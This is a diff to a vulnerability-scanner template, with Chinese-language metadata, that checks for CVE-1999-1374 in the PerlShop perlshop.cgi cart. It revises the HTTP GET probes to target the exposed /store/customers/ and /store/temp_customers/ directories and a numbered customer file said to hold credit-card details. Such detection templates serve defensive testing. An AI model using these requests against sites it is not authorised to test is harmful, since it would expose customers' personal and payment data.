@@ -1,14 +1,10 @@
 [info]
 author = "AVE"
-description = "检测 perlshop.cgi 购物车程序是否将客户敏感数据文件存储在 Web 根目录下可被直接访问"
+description = "检测 perlshop.cgi 购物车程序是否将客户数据目录（/store/customers/、/store/temp_customers/）暴露在 Web 根目录下，导致包含信用卡等个人信息的 8 位数字编号文件可被远程攻击者通过 HTTP 请求直接获取"
 id = "POC-AVE-1999-1090"
-name = "perlshop.cgi 购物车程序敏感信息泄露漏洞 PoC"
+name = "PerlShop perlshop.cgi 敏感信息泄露漏洞 PoC"
 severity = "medium"
-tags = [
-    "cve-1999-1374",
-    "perlshop",
-    "information-disclosure",
-]
+tags = ["cve-1999-1374"]
 vuln_id = [
     "CVE-1999-1374",
     "AVE-1999-1090",
@@ -19,49 +15,51 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/perlshop/orders.dat"
+path = "/{{BaseURL}}/store/customers/"
 protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = [
-    "order",
-    "credit",
-    "card",
-    "customer",
-    "total",
+status = [
+    200,
+    301,
+    302,
+    401,
+    403,
 ]
+type = "status"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/shop/data/customers.dat"
+path = "/{{BaseURL}}/store/temp_customers/"
 protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = [
-    "name",
-    "address",
-    "card",
-    "email",
-    "phone",
+status = [
+    200,
+    301,
+    302,
+    401,
+    403,
 ]
+type = "status"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/cgi-bin/perlshop.cgi"
+path = "/{{BaseURL}}/store/customers/00000001"
 protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = [
-    "perlshop",
-    "shopping cart",
-    "checkout",
-]
+status = [200]
+type = "status"
